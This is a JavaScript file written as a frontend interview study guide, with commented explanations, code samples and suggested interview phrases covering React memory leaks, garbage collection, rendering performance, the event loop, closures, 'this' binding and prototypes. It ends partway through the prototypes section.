// ==============================================================
// 🧠 FRONTEND INTERVIEW REVISION GUIDE
// Format per topic: What it is → How it works → Key points → Interview phrases
// Read the full section for revision. Scan 🗣️ lines before an interview.
// ==============================================================


// ── 1. DETECTING MEMORY LEAKS IN REACT ────────────────────────
/**
 * WHAT IS A MEMORY LEAK?
 * Your app is holding onto data or references it no longer needs.
 * Normally the browser's garbage collector frees unused memory — but it
 * can only collect objects that have NO references pointing to them.
 * A leak means something (a timer, listener, closure) is still holding
 * a reference to an object that should have been freed — so heap grows.
 * Over time: sluggish app, tab crashes, high memory in Task Manager.
 *
 * HOW TO DETECT IN CHROME DEVTOOLS:
 *
 * 1. Heap Snapshot (most reliable):
 *    DevTools → Memory → Heap Snapshot
 *    - Take Snapshot 1 (baseline)
 *    - Do the action (open/close a modal, navigate, fetch)
 *    - Take Snapshot 2
 *    - Switch to "Comparison" view
 *    - Look for objects with positive delta (grew) that shouldn't persist
 *    - Look for "Detached DOM nodes" — DOM elements removed from the tree
 *      but still referenced by JS (classic React leak pattern)
 *
 * 2. Performance Monitor (quick visual check):
 *    DevTools → More Tools → Performance Monitor
 *    Watch the "JS Heap Size" line. Healthy app = it rises and falls.
 *    Memory leak = it keeps climbing and never drops.
 *
 * 3. Allocation Timeline:
 *    DevTools → Memory → Allocation instrumentation on timeline
 *    Records allocations over time. Shows WHERE allocations are happening.
 *    Use this to pinpoint WHEN the leak starts (e.g., on every route change).
 *
 * COMMON REACT LEAK PATTERNS:
 * - Component unmounts but its async fetch/timer/listener is still running
 * - The callback from that async work calls setState → updates stale state
 * - React 18 REMOVED the "Can't setState on unmounted component" warning
 *   but the underlying leak can still happen silently
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "I take two heap snapshots — before and after the action — and compare"
 * - "I look for Detached DOM nodes and objects with growing retained size"
 * - "Performance Monitor lets me visually confirm if heap is climbing over time"
 * - "React 18 removed the warning but memory leaks from unmounted components still exist"
 */


// ── 2. FIXING MEMORY LEAKS IN REACT ──────────────────────────
/**
 * THE GOLDEN RULE:
 * Everything you SET UP inside useEffect must be TORN DOWN in its cleanup function.
 * The cleanup runs: (1) before the next effect fires, and (2) when component unmounts.
 *
 * WHAT LEAKS AND HOW TO FIX IT:
 *
 * | Leak Source          | Fix                                        |
 * |----------------------|--------------------------------------------|
 * | setInterval          | clearInterval(id) in cleanup               |
 * | setTimeout           | clearTimeout(id) in cleanup                |
 * | addEventListener     | removeEventListener(...) in cleanup        |
 * | fetch / XHR          | AbortController.abort() in cleanup         |
 * | WebSocket            | ws.close() in cleanup                      |
 * | Store subscription   | call the returned unsubscribe() in cleanup |
 * | IntersectionObserver | observer.disconnect() in cleanup           |
 * | Large closure refs   | use useRef + null out in cleanup           |
 *
 * THE MODERN PATTERN — AbortController:
 * AbortController is the best tool because ONE controller can cancel BOTH
 * fetch requests AND event listeners at the same time.
 *
 * useEffect(() => {
 *   const ctrl = new AbortController();
 *
 *   fetch('/api/data', { signal: ctrl.signal })   // cancelled on abort
 *     .then(res => res.json())
 *     .then(setData)
 *     .catch(err => { if (err.name !== 'AbortError') console.error(err); });
 *
 *   window.addEventListener('resize', handleResize, { signal: ctrl.signal }); // also cancelled!
 *
 *   return () => ctrl.abort(); // one call cancels everything above
 * }, []);
 *
 * WHY REACT 18 STRICT MODE HELPS:
 * In development, Strict Mode mounts → unmounts → remounts every component.
 * This forces your cleanup to run on the first unmount. If you have no cleanup,
 * you'll see duplicate effects and duplicate API calls — which exposes missing cleanups.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "Every useEffect that sets something up must return a cleanup function"
 * - "AbortController can cancel fetch AND event listeners with a single abort() call"
 * - "React 18 Strict Mode double-mounts components in dev to surface missing cleanups"
 * - "The cleanup runs both before the next effect fires AND on unmount"
 */


// ── 3. JAVASCRIPT GARBAGE COLLECTION ─────────────────────────
/**
 * WHAT IS GARBAGE COLLECTION?
 * The JS engine automatically frees memory that's no longer reachable.
 * You don't manually free memory in JS — the GC is the janitor.
 * But you CAN accidentally keep objects alive by holding references → memory leak.
 *
 * HOW IT WORKS — MARK AND SWEEP:
 * JS uses "mark-and-sweep" algorithm (NOT reference counting).
 *
 * Step 1 — Mark: Starting from "roots" (global object, current call stack,
 *   active closures), the GC traverses every reachable reference and marks it.
 * Step 2 — Sweep: Everything NOT marked is considered garbage → memory freed.
 *
 * Why NOT reference counting? Because it fails on circular references:
 *   obj A references obj B, obj B references obj A.
 *   Both have ref count > 0 even if nothing else points to them.
 *   Mark-and-sweep handles this correctly — if neither is reachable from roots, both get swept.
 *
 * V8 GENERATIONAL GC (how Chrome/Node actually does it):
 * V8 splits the heap into two generations based on a key observation:
 * "Most objects die young" (short-lived closures, temp arrays, render results).
 *
 * Young Generation (Nursery / New Space):
 * - Small (a few MB), collected very frequently (every few ms)
 * - Uses "Scavenge" algorithm — fast, copies survivors to another half-space
 * - Objects that survive 2 scavenges get PROMOTED to Old Generation
 *
 * Old Generation (Old Space):
 * - Large, collected infrequently (major GC, can pause for 100ms+)
 * - Uses Mark-Sweep + Mark-Compact
 * - Where your long-lived data lives (component state, cached data, module-level vars)
 *
 * GC PRESSURE IN REACT (creating too much garbage too fast):
 * - Inline objects in JSX: <Chart data={{labels, values}} />
 *   → new object created on EVERY render → young gen fills up fast → frequent GCs
 * - Array method chains: data.map(...).filter(...).reduce(...)
 *   → each step creates a new intermediate array → 3 arrays created, 2 become garbage immediately
 * - Fix: useMemo for expensive computations, define objects outside JSX or use useMemo
 *
 * WeakMap and WeakRef — GC-friendly references:
 * - A WeakMap holds its keys "weakly" — if nothing else references the key object,
 *   GC is allowed to collect it. The entry silently disappears from the map.
 * - Perfect for: caching computed results keyed by DOM nodes or objects
 *   (the cache auto-cleans itself as the DOM elements are removed)
 * - WeakRef: holds a weak reference to an object, .deref() returns it or undefined if collected
 *
 * IMPORTANT: A memory leak = the object IS still reachable (even if you "don't need it").
 * GC cannot collect reachable objects. The fix is always to REMOVE the reference.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "JS uses mark-and-sweep, not reference counting — handles circular refs correctly"
 * - "V8 uses generational GC: young space is collected frequently and fast, old space is slower"
 * - "Most objects die young — that's why the young gen scavenge is so efficient"
 * - "A memory leak means the object is still reachable — GC can't help, you must remove the ref"
 * - "Inline objects in JSX create GC pressure by allocating a new object on every render"
 * - "WeakMap lets you cache without keeping objects alive — keys are GC'd when unreferenced"
 */


// ── 4. UI JANK — CAUSES AND FIXES ────────────────────────────
/**
 * WHAT IS JANK?
 * Jank is visible stuttering — animations freeze, scrolling skips, clicks feel delayed.
 * It happens when the browser misses its 60fps target and drops a frame.
 *
 * THE BUDGET: At 60fps, the browser has only 16.6ms to do everything for one frame.
 * If ANY single task exceeds that, the frame is dropped and the user sees a stutter.
 *
 * WHAT HAPPENS IN ONE FRAME (the rendering pipeline):
 * Input events → JavaScript → requestAnimationFrame → Style calculation
 * → Layout (reflow) → Paint → Composite → GPU → screen
 * Every single step must fit in 16.6ms. JS is usually the bottleneck.
 *
 * COMMON CAUSES AND FIXES:
 *
 * 1. LONG JAVASCRIPT TASKS (> 50ms blocks the thread):
 *    Cause: heavy loops, large array processing, synchronous API calls
 *    Fix: Break into chunks and yield back to the browser between chunks
 *
 * 2. LAYOUT THRASHING (most common hidden cause):
 *    Cause: Reading a layout property (offsetWidth, getBoundingClientRect)
 *           then writing a style (element.style.width = ...) in a loop.
 *           Every read AFTER a write forces the browser to recalculate layout synchronously.
 *    Fix: Batch ALL reads first, then batch ALL writes.
 *         FastDOM library does this automatically.
 *
 * 3. ANIMATING EXPENSIVE PROPERTIES (width, height, top, left):
 *    Cause: These properties trigger Layout → Paint → Composite (3 stages).
 *    Fix: Only animate `transform` and `opacity`.
 *         They skip layout and paint entirely — handled by the GPU compositor layer.
 *         transform: translateX(100px) is the same visually as left:100px but 10x cheaper.
 *
 * 4. BLOCKING SCROLL LISTENERS:
 *    Cause: Browser doesn't know if your scroll handler calls preventDefault().
 *           It waits for your handler to finish before scrolling. This makes scroll janky.
 *    Fix: { passive: true } tells the browser "I promise I won't call preventDefault".
 *         Browser can then scroll immediately on the GPU thread.
 *
 * 5. HEAVY COMPUTATION ON MAIN THREAD:
 *    Fix: Move to a Web Worker (separate thread, no DOM access).
 *         Main thread stays free for rendering.
 *
 * 6. GIANT DOM (10,000+ nodes):
 *    Cause: Browser must calculate styles, layout for every node every frame.
 *    Fix: Virtualization — only render the DOM nodes currently visible.
 *         react-window, react-virtual: render ~20 rows regardless of total count.
 *
 * 7. REACT-SPECIFIC:
 *    Cause: A heavy state update (filtering 10K items) blocks re-render of other UI.
 *    Fix: useTransition marks an update as "non-urgent". React can interrupt it
 *         to handle more urgent updates (clicks, typing) first.
 *         useDeferredValue defers an expensive child's render.
 *
 * TARGET: INP (Interaction to Next Paint) < 200ms — this is a Core Web Vital since 2024.
 */

// Chunk processing pattern — yield to browser between chunks:
async function processInChunks(items, chunkSize = 50) {
  for (let i = 0; i < items.length; i += chunkSize) {
    items.slice(i, i + chunkSize).forEach(item => heavyWork(item));
    await new Promise(r => setTimeout(r, 0)); // yield: browser gets to breathe
  }
}
function heavyWork(item) { /* ... */ }

/**
 * 🗣️ SAY IN INTERVIEW:
 * - "60fps = 16.6ms per frame budget — any task exceeding that drops a frame"
 * - "Layout thrashing = interleaving DOM reads and writes forces synchronous reflow"
 * - "Only animate transform and opacity — they're GPU composited, skip layout and paint"
 * - "passive: true on scroll listeners lets the browser scroll on the GPU thread immediately"
 * - "Web Workers move heavy computation off the main thread entirely"
 * - "INP < 200ms is the Core Web Vital target for interaction responsiveness"
 */


// ── 5. REACT BUNDLE SIZE OPTIMIZATION ────────────────────────
/**
 * WHY IT MATTERS:
 * Every KB of JavaScript shipped to the user must be:
 * downloaded → parsed → compiled → executed.
 * On a slow 3G mobile connection, 1MB of JS = ~10 seconds before the page is interactive.
 * This directly impacts LCP (Largest Contentful Paint) and TTI (Time to Interactive).
 *
 * STRATEGIES:
 *
 * 1. CODE SPLITTING — the biggest win:
 *    Instead of shipping one giant bundle, split into chunks loaded on demand.
 *    - Route-level: const Dashboard = React.lazy(() => import('./Dashboard'))
 *      Wrapped in <Suspense fallback={<Spinner/>}>, React only loads Dashboard's
 *      JS when the user navigates to that route.
 *    - Component-level: lazy-load heavy components (rich text editors, chart libs)
 *      only when they appear on screen.
 *    - Dynamic import() for features triggered by user action:
 *      button click → import('./pdf-export') → only loads when user clicks export.
 *
 * 2. TREE SHAKING — remove dead code:
 *    Bundlers (webpack, Rollup, Vite) can statically analyze ES module imports
 *    and remove exports that are never imported. This ONLY works with ES modules.
 *    - ✅ import debounce from 'lodash/debounce'  → ships only debounce (1KB)
 *    - ❌ import _ from 'lodash'                   → ships all of lodash (70KB)
 *    - ❌ const _ = require('lodash')              → require() is dynamic, can't tree-shake
 *    BARREL FILE TRAP: An index.js that re-exports everything:
 *      export * from './utils'; export * from './helpers';
 *      This can cause the bundler to import the ENTIRE barrel even if you only need one thing.
 *      Fix: import directly from the file, not the barrel.
 *
 * 3. REPLACE HEAVY DEPENDENCIES:
 *    | Heavy library  | Lighter alternative   | Size saving |
 *    |----------------|-----------------------|-------------|
 *    | moment.js      | dayjs                 | 300KB → 2KB |
 *    | lodash         | lodash-es + cherry-pick| 70KB → ~1KB |
 *    | axios          | native fetch          | 13KB → 0    |
 *    | uuid           | crypto.randomUUID()   | ~6KB → 0    |
 *
 * 4. ANALYZE YOUR BUNDLE:
 *    - webpack-bundle-analyzer: visual treemap of your bundle
 *    - bundlephobia.com: check the cost of a package BEFORE installing it
 *    - Run analyzer first — find the biggest offender, fix that, repeat.
 *
 * 5. COMPRESSION:
 *    - Brotli > gzip (~15-20% better compression ratio)
 *    - Configure on your CDN/server. Vite + nginx/Cloudflare handle this easily.
 *
 * 6. VENDOR SPLITTING:
 *    Separate your node_modules (vendor) into their own chunk.
 *    Your app code changes every deploy. Vendor code changes rarely.
 *    Users cache the vendor chunk long-term → only re-download your app code.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "I run webpack-bundle-analyzer first to find the biggest offenders"
 * - "Route-level code splitting with React.lazy gives the biggest single win"
 * - "Tree shaking only works with ES modules — require() defeats it"
 * - "Barrel files can silently defeat tree shaking — import directly from the source file"
 * - "I check bundlephobia.com before adding any new dependency"
 */


// ── 6. REACT PERFORMANCE OPTIMIZATION ────────────────────────
/**
 * KEY INSIGHT:
 * In React, "render" means calling your component function.
 * It does NOT mean the DOM was updated (React diffs first).
 * A "wasted render" = your function ran, produced JSX, React diffed it,
 * found nothing changed, and threw the result away. Pure wasted CPU.
 *
 * WHEN DOES A COMPONENT RE-RENDER?
 * 1. Its own state changes (setState called)
 * 2. Its parent re-renders — EVEN IF the props passed to it didn't change.
 *    This surprises people. By default, React re-renders all children.
 * 3. A Context value it subscribes to changes
 *
 * THE OPTIMIZATION TOOLKIT:
 *
 * React.memo(Component):
 *   Wraps a component. Before re-rendering, shallowly compares new props to old.
 *   If props are the same (by reference), skips the render entirely.
 *   ⚠️ Useless if parent passes a new object/array/function literal every render:
 *      <Chart data={{x: 1}} /> — new object reference every time → memo always misses.
 *
 * useMemo(() => compute(), [deps]):
 *   Caches the RESULT of an expensive calculation.
 *   Only recomputes when deps change.
 *   Also used to create stable object references for memo'd children.
 *   const data = useMemo(() => ({ x: 1 }), []); // same reference every render
 *
 * useCallback(fn, [deps]):
 *   Caches a FUNCTION reference (not its result).
 *   A function defined inline in JSX = new reference every render.
 *   If you pass it to a memo'd child, that child re-renders every time anyway.
 *   useCallback ensures the same function reference is passed down.
 *
 * Virtualization (react-window, TanStack Virtual):
 *   For lists of 100+ items. Instead of rendering 10,000 DOM nodes,
 *   only render the ~20 visible in the viewport. As you scroll, recycle DOM nodes.
 *   Non-negotiable for large lists.
 *
 * State colocation:
 *   Keep state as close to where it's used as possible.
 *   Lifting state to App re-renders App + all its children on every keystroke.
 *   Keep `searchQuery` in SearchBox if only SearchBox + Results need it.
 *
 * Context splitting:
 *   One giant <AppContext> with theme + user + cart + filters:
 *   updating cart re-renders EVERY component using AppContext.
 *   Fix: split into <ThemeContext>, <UserContext>, <CartContext>.
 *   Components only re-render when the specific context they use changes.
 *
 * useTransition (React 18+):
 *   Some updates are "urgent" (typing in a search box — must feel instant).
 *   Some are "non-urgent" (filtering 10K items to show results).
 *   startTransition(() => setFilter(value)) marks the filter update as non-urgent.
 *   React can pause it to handle urgent updates first → UI stays responsive.
 *
 * ANTI-PATTERNS TO AVOID:
 * - <Component style={{color: 'red'}} /> — new object every render
 * - key={index} for dynamic lists — React can't track items correctly on reorder/delete
 * - setState in useEffect to derive state — compute it directly during render
 * - Single giant Context — split by update frequency
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "I profile first with React DevTools Profiler — find what's actually slow before optimizing"
 * - "Most performance issues in React are unnecessary re-renders caused by unstable references"
 * - "React.memo + useMemo + useCallback work together — memo is useless without stable refs"
 * - "State colocation is the cheapest fix — don't lift state higher than needed"
 * - "For large lists, virtualization is non-negotiable"
 * - "Context is not a state manager — it re-renders ALL consumers on any value change"
 * - "useTransition keeps the UI responsive during heavy non-urgent updates"
 */


// ── 7. WHAT HAPPENS WHEN YOU TYPE A URL AND HIT ENTER? ────────
/**
 * This is THE classic full-stack interview question. Walk through each step.
 * The more layers you can explain, the more senior you sound.
 *
 * STEP 1 — URL Parse + HSTS Check (~0ms):
 * Browser parses the URL to extract protocol, domain, path, query.
 * Checks if it's a valid URL or a search query.
 * HSTS (HTTP Strict Transport Security): browser has a local list of domains
 * that must always use HTTPS. If the domain is in that list, http:// is
 * automatically upgraded to https:// before any request is made.
 *
 * STEP 2 — DNS Resolution (0–100ms):
 * Domain name → IP address.
 * Cache hierarchy (checked in order, fastest to slowest):
 *   Browser cache → OS cache → Router cache → ISP resolver
 *   → Root nameserver → TLD nameserver (.com) → Authoritative nameserver
 * Optimization: <link rel="dns-prefetch" href="//api.example.com"> resolves DNS early.
 *
 * STEP 3 — TCP Handshake (1 RTT, ~10–50ms):
 * Establishes a reliable connection. Three-way handshake:
 *   Client → SYN → Server
 *   Server → SYN-ACK → Client
 *   Client → ACK → Server
 * Both sides confirm they can send AND receive before any data moves.
 *
 * STEP 4 — TLS Handshake (1–2 RTT, ~50ms):
 * For HTTPS. Negotiates encryption:
 *   - Server sends its certificate (proves identity)
 *   - Client and server agree on a cipher suite
 *   - Session keys are exchanged
 * TLS 1.3 reduced this to 1 RTT. For repeat visits: 0-RTT (session resumption).
 *
 * STEP 5 — HTTP Request:
 * Browser sends: GET /path HTTP/2 with headers (Accept-Encoding, Cookie, User-Agent...).
 * HTTP/2 advantages over HTTP/1.1:
 *   - Multiplexing: multiple requests over one TCP connection (no head-of-line blocking)
 *   - Header compression (HPACK)
 *   - Binary framing (more efficient than text)
 *   - Server push (deprecated in HTTP/3)
 *
 * STEP 6 — Server Processing (50–500ms):
 * Request hits: CDN edge → Load balancer → Web server → App server → DB/Cache → response.
 * CDN hit = much faster (serves from edge node near the user).
 *
 * STEP 7 — HTTP Response:
 * Server sends HTML + headers:
 *   Cache-Control: max-age=3600
 *   ETag: "abc123" (for conditional requests)
 *   Content-Encoding: br (Brotli compressed)
 *
 * STEP 8 — CRITICAL RENDERING PATH (browser builds the page):
 *   HTML bytes → parsed → DOM tree
 *   CSS bytes  → parsed → CSSOM tree
 *   DOM + CSSOM → Render Tree (only visible nodes)
 *   Render Tree → Layout (calculate positions + sizes)
 *   Layout → Paint (pixels to layers)
 *   Paint → Composite (GPU assembles layers → screen)
 *
 *   BLOCKERS:
 *   - CSS is render-blocking: browser won't paint ANYTHING until CSSOM is built.
 *     (It needs styles to know how to lay things out.)
 *   - <script> without async/defer PAUSES HTML parsing completely.
 *     Browser stops, downloads + executes the script, then resumes parsing.
 *
 * STEP 9 — JavaScript Execution + React Hydration:
 * For SSR apps: server sent pre-rendered HTML (user sees content fast).
 * JS downloads, React "hydrates" — it walks the existing DOM and attaches
 * event listeners. The page goes from "looks interactive" to "is interactive".
 *
 * SCRIPT LOADING ATTRIBUTES:
 * | Attribute | Download     | Execute           | Respects order? |
 * |-----------|--------------|-------------------|-----------------|
 * | (none)    | Blocks parse | Immediately       | Yes             |
 * | defer     | Parallel     | After DOM parsed  | Yes             |
 * | async     | Parallel     | ASAP (interrupts) | No              |
 * Use defer for scripts that need the DOM.
 * Use async for independent scripts that don't (analytics, ads).
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "DNS resolves domain to IP, cached at browser/OS/router/ISP level"
 * - "TCP handshake establishes connection, TLS handshake encrypts it"
 * - "CSS is render-blocking — browser won't paint until CSSOM is complete"
 * - "Script without async/defer blocks HTML parsing"
 * - "defer for DOM-dependent scripts, async for independent ones like analytics"
 * - "React hydration attaches event listeners to server-rendered HTML"
 */


// ── 8. THE EVENT LOOP ─────────────────────────────────────────
/**
 * WHAT IS IT?
 * JavaScript is single-threaded — only one thing runs at a time.
 * But the browser handles async work (timers, fetch, events) in the background.
 * The event loop is the mechanism that decides WHEN async callbacks get to run.
 *
 * THE COMPONENTS:
 * 1. Call Stack — where code actually executes. One frame at a time (LIFO).
 * 2. Web APIs — browser-provided environment (setTimeout, fetch, DOM events).
 *    When you call setTimeout, the browser handles the countdown outside JS.
 * 3. Microtask Queue — high priority async callbacks:
 *    Promise.then, Promise.catch, async/await continuations,
 *    queueMicrotask(), MutationObserver callbacks
 * 4. Macrotask Queue (Task Queue) — lower priority:
 *    setTimeout, setInterval, I/O callbacks, UI events (click, keydown)
 *
 * THE ALGORITHM (runs continuously):
 * 1. Run ALL synchronous code on the call stack until empty.
 * 2. Drain the ENTIRE microtask queue.
 *    (If a microtask adds more microtasks, those run too — before any macrotask)
 * 3. Pick ONE macrotask → run it → go back to step 2.
 * 4. If needed, render the frame (rAF callbacks fire here, before paint).
 * 5. Repeat.
 *
 * PRIORITY: Sync > Microtasks > rAF > Macrotasks
 *
 * WHY THIS MATTERS:
 * - setTimeout(() => ..., 0) doesn't mean "run now". It means "run after current
 *   sync code AND all pending microtasks".
 * - Infinite microtasks (recursive Promise.resolve chains) will STARVE rendering
 *   and all macrotasks — the page freezes.
 * - async/await: code BEFORE the first await runs synchronously.
 *   Code AFTER await is queued as a microtask when the awaited promise resolves.
 */

// ── Classic output questions: ──
console.log('1');
setTimeout(() => console.log('2'), 0);   // macrotask — goes to task queue
Promise.resolve().then(() => {
  console.log('3');                        // microtask
  Promise.resolve().then(() => console.log('4')); // nested microtask — still before '2'
});
console.log('5');
// OUTPUT: 1, 5, 3, 4, 2
// Why: 1 and 5 are sync. Then microtask queue drains (3, then 4). Then macrotask (2).

async function asyncFn() {
  console.log('A');        // sync — runs immediately when asyncFn() is called
  await Promise.resolve(); // suspends here, rest queued as microtask
  console.log('B');        // microtask — runs after current sync code
}
console.log('C');
setTimeout(() => console.log('D'), 0); // macrotask
asyncFn();
console.log('E');
// OUTPUT: C, A, E, B, D
// Why: C → asyncFn starts → A → hits await (suspends) → E → microtask B → macrotask D

/**
 * 🗣️ SAY IN INTERVIEW:
 * - "JS is single-threaded. The event loop coordinates async work."
 * - "Microtasks (Promise.then) ALWAYS run before the next macrotask (setTimeout)"
 * - "The entire microtask queue is drained — including newly added ones — before any macrotask"
 * - "Code after await is scheduled as a microtask when the promise resolves"
 * - "setTimeout 0 doesn't mean immediate — it means after sync + all microtasks"
 * - "rAF fires after microtasks but before the browser paints"
 */


// ── 9. CLOSURES, SCOPE & HOISTING ────────────────────────────
/**
 * ─── CLOSURES ───
 * WHAT IS A CLOSURE?
 * A closure is created every time a function is defined inside another function.
 * The inner function gets a "backpack" — it carries a reference to all variables
 * from its outer scope. Even after the outer function has returned and its
 * execution context is gone, the inner function still has access to those variables.
 *
 * That's the key insight: the variables aren't copied — they're REFERENCED.
 * The inner function holds a live reference to the outer scope.
 *
 * PRACTICAL USES OF CLOSURES:
 * 1. Data privacy / module pattern — hide variables, expose only what you want
 * 2. Factory functions — create customized functions (makeAdder, createValidator)
 * 3. Memoization — cache results in a closure-held Map
 * 4. Debounce / Throttle — timer ID lives in the closure
 * 5. Once — "called" flag lives in the closure
 * 6. Currying / partial application
 *
 * IMPORTANT: Each CALL to the outer function creates a SEPARATE closure.
 * createCounter() called twice = two independent `count` variables.
 *
 * STALE CLOSURES IN REACT:
 * useEffect with empty deps [] captures the INITIAL value of state/props.
 * If state changes later, the effect's closure still sees the old value.
 * Fix: add the value to the deps array, or use a ref.
 *
 * ─── SCOPE ───
 * Scope = where a variable is visible.
 * JS uses LEXICAL (static) scoping: scope is determined by WHERE you write the code,
 * not where it's called from.
 *
 * Scope types:
 * - Global: accessible everywhere. var goes on window, let/const do NOT.
 * - Function: var is function-scoped — it ignores blocks ({} if/for/while)
 * - Block: let/const are block-scoped — they only exist inside the {} they're declared in
 * - Module: each file has its own scope. Top-level vars are NOT global.
 * - Lexical: inner functions can access outer variables (but not vice versa)
 *
 * SCOPE CHAIN:
 * When a variable isn't found in the current scope, JS looks UP the chain:
 * current scope → parent → parent → global → ReferenceError
 * It NEVER looks down (outer scopes can't access inner variables).
 *
 * ─── HOISTING ───
 * Before execution, JS scans declarations and "hoists" them to the top of their scope.
 *
 * | Declaration          | Hoisted? | Initialized?           |
 * |----------------------|----------|------------------------|
 * | var                  | ✅ Yes   | undefined              |
 * | let / const          | ✅ Yes   | ❌ No — TDZ applies   |
 * | function declaration | ✅ Yes   | ✅ Fully (body too)   |
 * | function expression  | var only | undefined              |
 *
 * TDZ (Temporal Dead Zone):
 * let/const ARE hoisted to the top of their block, but accessing them before
 * their declaration line throws a ReferenceError. They're in a "dead zone"
 * from the start of the block until the declaration is reached.
 * This is why `let x = x + 1` throws even if x is declared below.
 */

// THE classic closure + var interview question:
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
}
// OUTPUT: 3, 3, 3
// Why: var is function-scoped, so all 3 callbacks share the SAME `i`.
// By the time they run, the loop finished and i = 3.

for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
}
// OUTPUT: 0, 1, 2
// Why: let is block-scoped. Each iteration creates a NEW binding of `i`.
// Each callback closes over its own copy.

// Tricky: var hoisting inside a function
var x = 1;
function foo() {
  console.log(x); // undefined — NOT 1!
  // var x is hoisted to the top of foo(), but not initialized yet
  var x = 2;
  console.log(x); // 2
}

// Tricky: lexical scope vs call-site
var color = 'global';
function getColor() { return color; }  // looks up where DEFINED (global)
function wrapper() {
  var color = 'local';
  return getColor(); // still returns 'global' — getColor's scope was set at definition
}

// Data privacy (module pattern):
function createCounter() {
  let count = 0; // private — no outside access
  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount:  () => count,
  };
}
const counter = createCounter();
counter.increment(); // 1
counter.increment(); // 2
// count is inaccessible directly — only through the returned methods

// Memoize — cache lives in closure:
function memoize(fn) {
  const cache = new Map();
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key);
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

// Debounce — timer ID lives in closure:
function debounce(fn, delay) {
  let timerId;
  return function(...args) {
    clearTimeout(timerId);
    timerId = setTimeout(() => fn.apply(this, args), delay);
  };
}

// Once — can only be called once, returns same result after that:
function once(fn) {
  let called = false;
  let result;
  return function(...args) {
    if (!called) {
      called = true;
      result = fn.apply(this, args);
    }
    return result;
  };
}

/**
 * 🗣️ SAY IN INTERVIEW:
 * - "A closure is a function + its lexical environment — it carries its outer scope"
 * - "var in loops creates a SHARED binding — all callbacks close over the same variable"
 * - "let in loops creates a new binding per iteration — each callback gets its own copy"
 * - "Each call to the outer function creates a completely separate closure"
 * - "Practical uses: data privacy, debounce, memoize, once, currying"
 * - "Stale closure in React: useEffect with [] captures initial state and never updates"
 * - "var is function-scoped, let/const are block-scoped"
 * - "JS uses lexical scoping — determined at write time, not call time"
 * - "TDZ: let/const are hoisted but accessing them before declaration = ReferenceError"
 */


// ── 10. THIS KEYWORD, CALL, APPLY, BIND ──────────────────────
/**
 * WHAT IS `this`?
 * `this` refers to the execution context — the object that "owns" the current function call.
 * The CRITICAL rule: `this` is determined by HOW the function is called, NOT where it's defined.
 * (Arrow functions are the exception — more on that below.)
 *
 * BINDING RULES (checked in priority order):
 *
 * 1. new binding: new Fn()
 *    A brand new empty object is created, `this` = that object.
 *    The constructor populates it.
 *
 * 2. Explicit binding: fn.call(obj), fn.apply(obj), fn.bind(obj)
 *    You manually specify what `this` should be.
 *
 * 3. Implicit binding: obj.method()
 *    `this` = the object to the LEFT of the dot.
 *    The function doesn't "belong" to the object — it just has context when called that way.
 *
 * 4. Default binding: fn() — standalone call
 *    `this` = global object (window in browser).
 *    In strict mode: `this` = undefined. (This is why class methods use strict mode.)
 *
 * 5. Arrow functions — lexical `this`:
 *    Arrow functions have NO `this` of their own.
 *    They inherit `this` from the ENCLOSING scope where they were DEFINED.
 *    It is permanently fixed at creation time and cannot be changed with call/apply/bind.
 *
 *    → Perfect for: callbacks inside methods (you want to preserve the outer `this`)
 *    → Wrong for: object methods (the object becomes the outer scope, not `this`)
 *    → Wrong for: constructors (can't be used with `new`)
 *
 * CALL vs APPLY vs BIND:
 * | Method | Executes immediately? | How to pass args     |
 * |--------|----------------------|----------------------|
 * | call   | ✅ Yes               | comma-separated      |
 * | apply  | ✅ Yes               | as an array          |
 * | bind   | ❌ No (returns fn)   | comma-separated      |
 *
 * apply is useful when args are already in an array:
 * Math.max.apply(null, [1, 2, 3]) — or just Math.max(...[1, 2, 3]) in modern JS.
 *
 * bind is useful for:
 * - Passing methods as callbacks without losing `this`
 * - Partial application (pre-filling some arguments)
 */

const obj = {
  name: 'Alice',
  // Regular method — `this` depends on how it's called
  greet() {
    console.log(this.name);
  },
  // Arrow function — `this` is lexically inherited from outer scope (obj's context)
  // At object literal level, `this` is the outer context (window/undefined)
  greetArrow: () => console.log(this?.name), // `this` is NOT obj here!
};

obj.greet();       // "Alice" — implicit binding, left of dot = obj
obj.greetArrow();  // undefined — arrow has no own `this`, inherited from outer scope

const detached = obj.greet;
detached();        // undefined (strict) / window.name — default binding, no object

function intro(greeting, punct) {
  return `${greeting}, I'm ${this.name}${punct}`;
}
const bob = { name: 'Bob' };

intro.call(bob, 'Hi', '!');       // "Hi, I'm Bob!" — runs now, args listed
intro.apply(bob, ['Hi', '!']);    // "Hi, I'm Bob!" — runs now, args as array
const boundIntro = intro.bind(bob, 'Hey'); // returns new function, pre-fills 1st arg
boundIntro('.');                  // "Hey, I'm Bob." — runs later

/**
 * 🗣️ SAY IN INTERVIEW:
 * - "this is determined at call time — it depends on HOW the function is called"
 * - "Arrow functions have no own `this` — they lexically inherit from where they were defined"
 * - "call and apply execute immediately; bind returns a new function"
 * - "Losing `this` happens when you extract a method and call it standalone"
 * - "In event handlers, `this` = the element (unless you use arrow functions)"
 */


// ── 11. PROTOTYPES & INHERITANCE ─────────────────────────────
/**
 * WHAT IS PROTOTYPAL INHERITANCE?
 * In Java/C++, classes are blueprints and objects are instances.
 * In JavaScript, there are NO real classes (ES6 `class` is just syntax sugar).
 * Instead, objects link to other objects. That link is called the prototype chain.
 *
 * When you try to access a property on an object:
 * 1. JS looks at the object's OWN properties first.
 * 2. If not found, it looks at the object's [[Prototype]] (its parent object).
 * 3. If still not found, it looks at the parent's [[Prototype]].
 * 4. This continues until null is reached → returns undefined.
 *
 * This chain of lookups is the prototype chain.
 *
 * HOW IT WORKS MECHANICALLY:
 * - Every function in JS has a `.prototype` property (an object).
 * - When you call `new Fn()`, a new object is created, and its [[Prototype]]
 *   is set to `Fn.prototype`.
 * - Methods defined on `Fn.prototype` are SHARED across all instances.
 *   (Not copied onto each instance — looked up via the chain.)
 *
 * ES6 CLASS IS JUST SUGAR:
